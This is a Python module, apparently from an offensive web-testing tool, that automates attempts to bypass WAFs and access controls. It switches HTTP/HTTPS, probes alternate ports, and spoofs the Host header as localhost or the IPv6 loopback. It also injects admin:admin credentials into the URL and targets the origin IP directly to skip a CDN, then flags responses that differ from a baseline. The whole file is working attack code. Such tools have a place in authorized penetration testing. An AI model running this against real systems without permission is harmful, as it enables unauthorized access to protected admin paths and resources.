"""
Technique: Protocol & Port Bypasses
--------------------------------------
WAFs and access controls sometimes behave differently
based on port, protocol version, or scheme.

Techniques:
  - HTTP vs HTTPS switching
  - Non-standard ports (8080, 8443, 8888, etc.)
  - HTTP/1.0 request (disables chunked encoding, cache, host header)
  - Absolute URL in request line
  - IPv6 address in Host header
  - URL with auth credentials: https://admin:pass@target.com/path
  - CDN bypass via direct origin IP
"""

import socket
import urllib.parse
from ..core import http_request, is_bypass, colored_status, R, G, Y, C, DIM, BOLD, RST

# Ports to try
ALT_PORTS = [80, 443, 8080, 8443, 8888, 8000, 8001, 8008,
             3000, 3001, 4000, 4443, 5000, 5443, 9000, 9443,
             10443, 44443]


def run(url: str, baseline: dict,
        cookies: str = None, extra_headers: dict = None,
        verbose: bool = True) -> list:
    """Run protocol/port bypass techniques."""
    findings = []
    base_headers = extra_headers or {}

    parsed = urllib.parse.urlparse(url)
    host   = parsed.hostname
    path   = parsed.path or "/"
    orig_scheme = parsed.scheme

    if verbose:
        print(f"\n  {C}[PROTOCOL BYPASS]{RST} Testing scheme/port variants")

    def _test(test_url, technique, h=None):
        headers = {**base_headers, **(h or {})}
        resp    = http_request(test_url, headers=headers, cookies=cookies)
        bypassed, conf, reason = is_bypass(
            baseline["status"], resp["status"],
            baseline["body_length"], resp["body_length"]
        )
        result = {
            "technique":   "protocol_bypass",
            "variant":     technique,
            "url":         test_url,
            "status":      resp["status"],
            "body_length": resp["body_length"],
            "bypass":      bypassed,
            "confidence":  conf,
            "reason":      reason,
            "body_snippet":resp["body"][:200] if bypassed else "",
        }
        if bypassed:
            findings.append(result)
            if verbose:
                col = G if conf == "high" else Y
                print(f"\r{' '*70}\r  {col}{BOLD}[BYPASS]{RST} {technique}")
                print(f"    URL    : {test_url}")
                print(f"    Status : {colored_status(resp['status'])} | "
                      f"Length: {resp['body_length']}\n")
        elif verbose:
            print(f"  {DIM}[{colored_status(resp['status'])}]{RST} "
                  f"{technique:<40}", end="\r")
        return result

    # Scheme switch
    alt_scheme = "http" if orig_scheme == "https" else "https"
    alt_url    = url.replace(f"{orig_scheme}://", f"{alt_scheme}://", 1)
    _test(alt_url, f"scheme_{alt_scheme}")

    # Alt port variations
    for port in ALT_PORTS[:8]:
        alt = urllib.parse.urlunparse(
            parsed._replace(netloc=f"{host}:{port}")
        )
        _test(alt, f"port_{port}")

    # IPv6 loopback in Host header
    _test(url, "ipv6_host", {"Host": f"[::1]"})
    _test(url, "ipv6_host_port", {"Host": f"[::1]:443"})

    # Localhost in Host header
    _test(url, "localhost_host", {"Host": "localhost"})
    _test(url, "localhost_host_port", {"Host": "localhost:443"})

    # URL with credentials
    cred_url = f"{orig_scheme}://admin:admin@{host}{path}"
    _test(cred_url, "url_credentials")

    # Direct IP (resolve origin, bypass CDN)
    try:
        ips = socket.getaddrinfo(host, None, socket.AF_INET)
        if ips:
            orig_ip = ips[0][4][0]
            ip_url  = url.replace(host, orig_ip, 1)
            _test(ip_url, "direct_ip", {"Host": host})
    except Exception:
        pass

    if verbose:
        print(f"\r{' '*70}\r", end="")

    return findings
